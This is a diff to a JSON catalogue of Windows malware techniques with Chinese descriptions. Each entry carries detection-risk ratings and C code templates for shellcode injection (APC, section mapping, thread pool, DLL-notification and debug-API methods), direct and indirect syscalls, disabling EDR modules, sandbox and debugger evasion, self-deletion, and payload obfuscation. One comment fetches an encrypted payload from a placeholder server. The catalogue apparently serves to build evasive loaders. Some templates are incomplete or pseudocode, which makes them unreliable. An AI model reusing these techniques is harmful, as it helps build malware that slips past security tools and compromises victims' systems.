@@ -1,6 +1,6 @@
 {
   "version": "1.1",
-  "last_updated": "2026-03-06T12:00:00.000000",
+  "last_updated": "2026-03-06T15:00:00.000000",
   "techniques": [
     {
       "id": "T001",
@@ -1203,6 +1203,348 @@
       "category": "evasion",
       "source": "github: SaadAhla/D1rkInject",
       "type": "execution_evasion"
+    },
+    {
+      "id": "T067",
+      "name": "Hells Gate + Halos Gate SSN Resolution",
+      "type": "execution_evasion",
+      "description": "Hell's Gate和Halo's Gate技术组合，动态从NTDLL解析系统调用号(SSN)。当函数被Hook时(JMP指令)，通过遍历邻近系统调用计算目标SSN，支持检测多种Hook位置(first, third, eighth, tenth, twelfth instruction)",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: reveng007/DarkWidow, jakobfriedl/BenevolentLoader",
+      "apis": [
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtProtectVirtualMemory",
+        "NtCreateThreadEx"
+      ],
+      "code_template": "// Sort SSN from hooked syscall\nWORD SortSSN(LPVOID ntapiaddr) {\n    WORD SystemCall = NULL;\n    // Check if not hooked: mov r10, rcx; mov eax, SSN\n    if (*((PBYTE)ntapiaddr) == 0x4c && *((PBYTE)ntapiaddr + 1) == 0x8b\n        && *((PBYTE)ntapiaddr + 2) == 0xd1 && *((PBYTE)ntapiaddr + 3) == 0xb8) {\n        BYTE high = *((PBYTE)ntapiaddr + 5);\n        BYTE low = *((PBYTE)ntapiaddr + 4);\n        return (high << 8) | low;\n    }\n    // If hooked (JMP), check neighboring syscalls\n    if (*((PBYTE)ntapiaddr) == 0xe9 || *((PBYTE)ntapiaddr + 3) == 0xe9) {\n        for (WORD idx = 1; idx <= 500; idx++) {\n            // Check up and down neighbors\n        }\n    }\n}",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/reveng007/DarkWidow",
+        "https://github.com/jakobfriedl/BenevolentLoader"
+      ]
+    },
+    {
+      "id": "T068",
+      "name": "Direct Syscall APC Injection",
+      "type": "execution_evasion",
+      "description": "使用直接系统调用进行APC注入，创建挂起进程后使用NtAllocateVirtualMemory、NtWriteVirtualMemory、NtProtectVirtualMemory系统调用分配和写入shellcode",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: batuhan-arda/Direct-Syscall-APC-Injection-PoC-Malware",
+      "apis": [
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtProtectVirtualMemory",
+        "QueueUserAPC"
+      ],
+      "code_template": "// Allocate memory using syscall\nstatus = NtAllocateVirtualMemory_Syscall(hProcess, &pAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n// Write shellcode using syscall\nstatus = NtWriteVirtualMemory_Syscall(hProcess, pAddress, shellcode, shellcodeSize, &bytesWritten);\n\n// Change protection to RX\nstatus = NtProtectVirtualMemory_Syscall(hProcess, &pAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);\n\n// Queue APC\nQueueUserAPC((PAPCFUNC)pAddress, hThread, 0);\nResumeThread(hThread);",
+      "compatibility": [
+        "process_injection"
+      ],
+      "references": [
+        "https://github.com/batuhan-arda/Direct-Syscall-APC-Injection-PoC-Malware"
+      ]
+    },
+    {
+      "id": "T069",
+      "name": "API Hammering",
+      "type": "anti_analysis",
+      "description": "通过大量调用正常API来延迟执行，绕过沙箱的时间限制检测。使用大量无害API调用消耗时间，使沙箱超时或无法追踪完整执行流程",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "source": "github: jakobfriedl/BenevolentLoader",
+      "apis": [
+        "GetTickCount64",
+        "Sleep",
+        "CreateFile",
+        "CloseHandle"
+      ],
+      "code_template": "// API Hammering - stress = 1000 => ~5 seconds delay\nDWORD T0 = GetTickCount64();\nif (!ApiHammering(&Table, 1000)) {\n    return FALSE;\n}\n// Internally makes many benign API calls\n// to delay execution and bypass sandbox timeouts",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/jakobfriedl/BenevolentLoader"
+      ]
+    },
+    {
+      "id": "T070",
+      "name": "Self-Delete on Debug",
+      "type": "anti_analysis",
+      "description": "检测到调试器时自删除程序文件，移除磁盘痕迹并防止分析",
+      "complexity": "medium",
+      "detection_risk": "very_low",
+      "source": "github: jakobfriedl/BenevolentLoader",
+      "apis": [
+        "NtQueryInformationProcess",
+        "DeleteFile",
+        "MoveFileEx"
+      ],
+      "code_template": "// Check debugger via NtQueryInformationProcess\nif (DebuggerDetected(&Table)) {\n    INFO(\"Debugger detected via NtQueryInformationProcess.\");\n    if (!SelfDelete(&Table)) {\n        return FALSE;\n    }\n    return EXIT_SUCCESS;\n}\n\n// Self-delete implementation\nBOOL SelfDelete(PVX_TABLE Table) {\n    MoveFileExA(currentPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);\n    return TRUE;\n}",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/jakobfriedl/BenevolentLoader"
+      ]
+    },
+    {
+      "id": "T071",
+      "name": "Remote Mapping Injection",
+      "type": "execution_evasion",
+      "description": "使用NtCreateSection和NtMapViewOfSection在目标进程中映射shellcode，避免使用VirtualAllocEx和WriteProcessMemory等传统API",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: jakobfriedl/BenevolentLoader",
+      "apis": [
+        "NtCreateSection",
+        "NtMapViewOfSection",
+        "NtUnmapViewOfSection"
+      ],
+      "code_template": "// Create section in current process\nHANDLE hSection;\nNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &largeSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n\n// Map to current process (RW)\nPVOID pLocalAddress = NULL;\nNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalAddress, NULL, NULL, NULL, &viewSize, ViewUnmap, NULL, PAGE_READWRITE);\n\n// Copy shellcode\nmemcpy(pLocalAddress, shellcode, shellcodeSize);\n\n// Map to target process (RX)\nPVOID pRemoteAddress = NULL;\nNtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);",
+      "compatibility": [
+        "process_injection"
+      ],
+      "references": [
+        "https://github.com/jakobfriedl/BenevolentLoader"
+      ]
+    },
+    {
+      "id": "T072",
+      "name": "Brute-force Key Decryption",
+      "type": "string_obfuscation",
+      "description": "使用暴力破解密钥解密payload，密钥可能从URL参数或其他动态来源获取，增加分析难度",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "source": "github: jakobfriedl/BenevolentLoader",
+      "apis": [],
+      "code_template": "// Brute-force key decryption\nfor (DWORD key = 0; key < MAX_KEY; key++) {\n    if (DecryptPayload(encryptedPayload, key) == VALID_PAYLOAD) {\n        break;\n    }\n}\n\n// Alternative: key derived from URL parameter\n// Download from: http://server/enc.bin?key=XXX",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/jakobfriedl/BenevolentLoader"
+      ]
+    },
+    {
+      "id": "T073",
+      "name": "EDR Preloader / AppVerifier Hijacking",
+      "type": "unhooking",
+      "description": "通过劫持AppVerifier层阻止EDR加载DLL或Hook进程。利用KiUserApcDispatcher hook在EDR之前运行，替换EDR入口点为无害函数，实现EDR模块失效",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: MalwareTech/EDR-Preloader",
+      "apis": [
+        "LdrLoadDll",
+        "NtContinue",
+        "KiUserApcDispatcher"
+      ],
+      "code_template": "// Hook ntdll!KiUserApcDispatcher to run before EDR\n// Find .mrdata section in ntdll\nULONG_PTR mrdata = GetSectionBase(ntdllBase, \".mrdata\");\n\n// Replace EDR entrypoint with benign function\nvoid DisablePreloadedEdrModules() {\n    PEB* peb = NtCurrentTeb()->ProcessEnvironmentBlock;\n    LIST_ENTRY* list_head = &peb->Ldr->InMemoryOrderModuleList;\n    // Only ntdll, kernel32, kernelbase should be loaded early\n    // Anything else is probably an EDR\n    for each module in list:\n        if (module not in [ntdll, kernel32, kernelbase]):\n            module->EntryPoint = &EdrParadise; // benign function\n}",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/MalwareTech/EDR-Preloader"
+      ]
+    },
+    {
+      "id": "T074",
+      "name": "PoolParty - Thread Pool Injection",
+      "type": "execution_evasion",
+      "description": "利用Windows线程池(Thread Pool)进行进程注入，通过劫持线程池对象(Work, Wait, Timer, IO, ALPC, Job)实现代码执行，完全避免使用CreateThread/CreateRemoteThread等传统API",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: SafeBreach-Labs/PoolParty",
+      "apis": [
+        "CreateThreadpoolWork",
+        "CreateThreadpoolWait",
+        "CreateThreadpoolTimer",
+        "CreateThreadpoolIo",
+        "TpAllocAlpcCompletion",
+        "TpAllocJobNotification"
+      ],
+      "code_template": "// Thread Pool Work injection\nPFULL_TP_WORK pTpWork = CreateThreadpoolWork(callback, context, NULL);\nSubmitThreadpoolWork(pTpWork);\n\n// Thread Pool Wait injection\nPFULL_TP_WAIT pTpWait = CreateThreadpoolWait(callback, context, NULL);\nSetThreadpoolWait(pTpWait, hEvent, NULL);\n\n// Thread Pool Timer injection\nPFULL_TP_TIMER pTpTimer = CreateThreadpoolTimer(callback, context, NULL);\nSetThreadpoolTimer(pTpTimer, &dueTime, 0, 0);\n\n// Thread Pool IO injection\nPFULL_TP_IO pTpIo = CreateThreadpoolIo(hFile, callback, context, NULL);\nStartThreadpoolIo(pTpIo);\n\n// ALPC injection\nPFULL_TP_ALPC pTpAlpc = TpAllocAlpcCompletion(hAlpc, callback, context, NULL);\n\n// Job injection\nPFULL_TP_JOB pTpJob = TpAllocJobNotification(hJob, callback, context, NULL);",
+      "compatibility": [
+        "process_injection"
+      ],
+      "references": [
+        "https://github.com/SafeBreach-Labs/PoolParty"
+      ]
+    },
+    {
+      "id": "T075",
+      "name": "DLL Notification Callback Injection",
+      "type": "execution_evasion",
+      "description": "利用LdrpDllNotificationList注入shellcode。通过LdrRegisterDllNotification获取DLL通知列表头地址，在远程进程中插入伪造的通知条目，将回调函数指向shellcode",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: Dec0ne/DllNotificationInjection",
+      "apis": [
+        "LdrRegisterDllNotification",
+        "LdrUnregisterDllNotification",
+        "ReadProcessMemory",
+        "WriteProcessMemory"
+      ],
+      "code_template": "// Get LdrpDllNotificationList head\nPLIST_ENTRY GetDllNotificationListHead() {\n    PVOID cookie;\n    LdrRegisterDllNotification(0, DummyCallback, NULL, &cookie);\n    // Cookie is the last callback registered, its Flink holds the head\n    PLIST_ENTRY head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;\n    LdrUnregisterDllNotification(cookie);\n    return head;\n}\n\n// Inject malicious entry\nLDR_DLL_NOTIFICATION_ENTRY newEntry = {};\nnewEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)trampolineEx;\nnewEntry.List.Blink = (PLIST_ENTRY)headAddress;\n// Write to remote process and link into list",
+      "compatibility": [
+        "process_injection"
+      ],
+      "references": [
+        "https://github.com/Dec0ne/DllNotificationInjection"
+      ]
+    },
+    {
+      "id": "T076",
+      "name": "NullGate Indirect Syscall Library",
+      "type": "execution_evasion",
+      "description": "简化间接系统调用的C++库。自动从NTDLL解析系统调用号(SSN)，查找syscall指令地址，使用运行时XOR混淆函数名，提供类型安全的系统调用接口",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: 0xsch1zo/NullGate",
+      "apis": [
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtProtectVirtualMemory",
+        "NtCreateThreadEx"
+      ],
+      "code_template": "// NullGate syscall resolution\nsyscalls::syscalls() {\n    populateStubs();   // Find all Zw* exports\n    populateSyscalls(); // Map to sequential syscall numbers\n}\n\nDWORD getSyscallNumber(const std::string& funcName) {\n    return syscallNoMap.at(funcName);\n}\n\nuintptr_t getSyscallInstrAddr() {\n    // Find syscall; ret instruction (0F 05 C3) in any ntdll stub\n    const BYTE syscallOpcode[] = {0x0F, 0x05, 0xC3};\n    for (int i = 0; i < maxStubSize; i++) {\n        if (memcmp(syscallOpcode, stubBase + i, sizeof(syscallOpcode)) == 0)\n            return (uintptr_t)(stubBase + i);\n    }\n}\n\n// Execute indirect syscall\nnullgate_trampoline(args...);",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/0xsch1zo/NullGate"
+      ]
+    },
+    {
+      "id": "T078",
+      "name": "Ntdll Unpatching from Known Syscall Numbers",
+      "type": "unhooking",
+      "description": "从已知的系统调用号重建被Hook的NTDLL函数。不依赖从磁盘读取NTDLL，而是使用已知的干净系统调用号直接执行系统调用",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "source": "github: Signal-Labs/NtdllUnpatcher",
+      "apis": [
+        "NtQueryInformationFile",
+        "NtReadFile",
+        "VirtualProtect"
+      ],
+      "code_template": "// Known clean syscall numbers for different Windows versions\nstruct SyscallEntry {\n    DWORD win10_1507;\n    DWORD win10_1511;\n    DWORD win10_1607;\n    // ... versions\n};\n\nSyscallEntry NtAllocateVirtualMemory_SN = {0x18, 0x18, 0x18, ...};\n\n// Execute direct syscall with known SSN\nNTSTATUS ExecuteSyscall(DWORD ssn, ...) {\n    // Find syscall instruction address in any unhooked ntdll function\n    PVOID syscallAddr = FindSyscallInstruction();\n    \n    __asm__ volatile (\n        \"mov r10, rcx\\n\"\n        \"mov eax, %0\\n\"\n        \"jmp %1\\n\"\n        : : \"r\"(ssn), \"r\"(syscallAddr)\n    );\n}",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/Signal-Labs/NtdllUnpatcher"
+      ]
+    },
+    {
+      "id": "T079",
+      "name": "Debug API Injection",
+      "type": "execution_evasion",
+      "description": "使用Windows Debugging API实现无WriteProcessMemory的shellcode注入。通过DebugActiveProcess附加到目标进程，使用SetThreadContext修改线程上下文，利用硬件断点(HWBP)作为检查点，在目标进程上下文中执行代码。核心技巧是使用DbgBreakPoint获取返回地址，通过共享内存(FileMapping)传递数据",
+      "complexity": "complex",
+      "detection_risk": "medium",
+      "source": "github: thisarasewmina/DbgNexum",
+      "apis": [
+        "DebugActiveProcess",
+        "SetThreadContext",
+        "GetThreadContext",
+        "WaitForDebugEvent",
+        "ContinueDebugEvent",
+        "CreateFileMapping",
+        "MapViewOfFile"
+      ],
+      "code_template": "// Debug API Injection\nvoid DebugLoop(void) {\n    DEBUG_EVENT de;\n    int stage = 0;\n    \n    ResumeThread(g_hTargetThread);\n    \n    while (WaitForDebugEvent(&de, 10*1000)) {\n        if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {\n            CONTEXT ctx = { 0 };\n            ctx.ContextFlags = CONTEXT_ALL;\n            GetThreadContext(g_hTargetThread, &ctx);\n            \n            if (stage == 0) {\n                // Save stack anchor\n                dw64SavedRsp = ctx.Rsp;\n                // Set trap flag for single step\n                ctx.Rip = DbgBreakPoint + 1;\n                ctx.EFlags |= 0x100;\n                SetThreadContext(g_hTargetThread, &ctx);\n                stage = 1;\n            }\n            // ... Continue stages\n        }\n        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);\n    }\n}",
+      "compatibility": [
+        "process_injection"
+      ],
+      "references": [
+        "https://github.com/thisarasewmina/DbgNexum"
+      ]
+    },
+    {
+      "id": "T080",
+      "name": "Badbyte Shellcode Sanitization",
+      "type": "string_obfuscation",
+      "description": "Shellcode坏字节清除工具，通过多种技术移除shellcode中的坏字节(如\\x00)，同时保持功能不变。使用ML模型分析shellcode语义，生成等价但无坏字节的自修改代码",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "source": "github: umpolungfish/byvalver",
+      "apis": [],
+      "code_template": "// Badbyte sanitization pipeline\n// 1. Parse shellcode to identify bad bytes\n// 2. Generate equivalent instruction sequences\n// 3. Use self-modifying code to reconstruct original at runtime\n// Example: \\x00\\x00 -> self-modifying stub that writes \\x00\\x00 at runtime",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/umpolungfish/byvalver"
+      ]
+    },
+    {
+      "id": "T081",
+      "name": "IPv6 Address Encoding",
+      "type": "string_obfuscation",
+      "description": "将shellcode编码为IPv6地址字符串格式，在运行时解码执行。每个IPv6地址可编码16字节，使shellcode看起来像网络配置数据",
+      "complexity": "simple",
+      "detection_risk": "low",
+      "source": "github: Mars3illes/IPv6-Decryption",
+      "apis": [
+        "inet_pton",
+        "WSAStringToAddress"
+      ],
+      "code_template": "// IPv6 encoding\nconst char* ipv6_addresses[] = {\n    \"fc00:1234:5678:9abc:def0:1234:5678:9abc\",\n    // Each IPv6 address = 16 bytes of shellcode\n};\n\nvoid DecodeIPv6(const char* ipv6, BYTE* out) {\n    struct in6_addr addr;\n    inet_pton(AF_INET6, ipv6, &addr);\n    memcpy(out, &addr, 16);\n}\n\n// Decode all addresses\nfor (int i = 0; i < num_addresses; i++) {\n    DecodeIPv6(ipv6_addresses[i], shellcode + i * 16);\n}",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/Mars3illes/IPv6-Decryption"
+      ]
+    },
+    {
+      "id": "T082",
+      "name": "AES-256-CBC Shellcode Encryption",
+      "type": "string_obfuscation",
+      "description": "使用AES-256-CBC加密shellcode，配合Hell's Gate直接系统调用和Early Bird APC注入实现完整加载器链",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "source": "github: darkness215/darkcrypt",
+      "apis": [
+        "CryptAcquireContext",
+        "CryptImportKey",
+        "CryptDecrypt",
+        "NtAllocateVirtualMemory",
+        "QueueUserAPC"
+      ],
+      "code_template": "// AES-256-CBC decryption using CryptoAPI\nHCRYPTPROV hProv;\nHCRYPTKEY hKey;\nHCRYPTHASH hHash;\n\nCryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, 0);\nCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);\nCryptHashData(hHash, key, key_len, 0);\nCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);\nCryptDecrypt(hKey, 0, TRUE, 0, encrypted_shellcode, &shellcode_len);\n\n// Then use Hell's Gate syscalls + Early Bird APC for injection",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/darkness215/darkcrypt"
+      ]
+    },
+    {
+      "id": "T083",
+      "name": "Hardware Breakpoint Execution",
+      "type": "execution_evasion",
+      "description": "利用调试寄存器(DR0-DR3)设置硬件断点执行shellcode。通过设置DR7寄存器的相应位，可以在特定地址触发执行断点，无需修改代码段权限",
+      "complexity": "complex",
+      "detection_risk": "medium",
+      "source": "github: thisarasewmina/DbgNexum",
+      "apis": [
+        "SetThreadContext",
+        "GetThreadContext",
+        "DebugActiveProcess"
+      ],
+      "code_template": "// Hardware Breakpoint Execution\nCONTEXT ctx = { 0 };\nctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\nGetThreadContext(hThread, &ctx);\n\n// Set hardware breakpoint on shellcode address\nctx.Dr0 = (DWORD64)shellcode_addr;  // Breakpoint address\nctx.Dr7 = (1ULL << 0);              // Enable DR0\nctx.Dr7 &= ~(3ULL << 16);           // Execute breakpoint (RW=00)\nctx.Dr7 |= (0ULL << 18);            // Length = 1 byte\nctx.Dr6 = 0;                        // Clear status\n\nSetThreadContext(hThread, &ctx);\n// When RIP hits Dr0, exception triggers and handler can redirect execution",
+      "compatibility": [
+        "all_loaders"
+      ],
+      "references": [
+        "https://github.com/thisarasewmina/DbgNexum"
+      ]
     }
   ]
 }
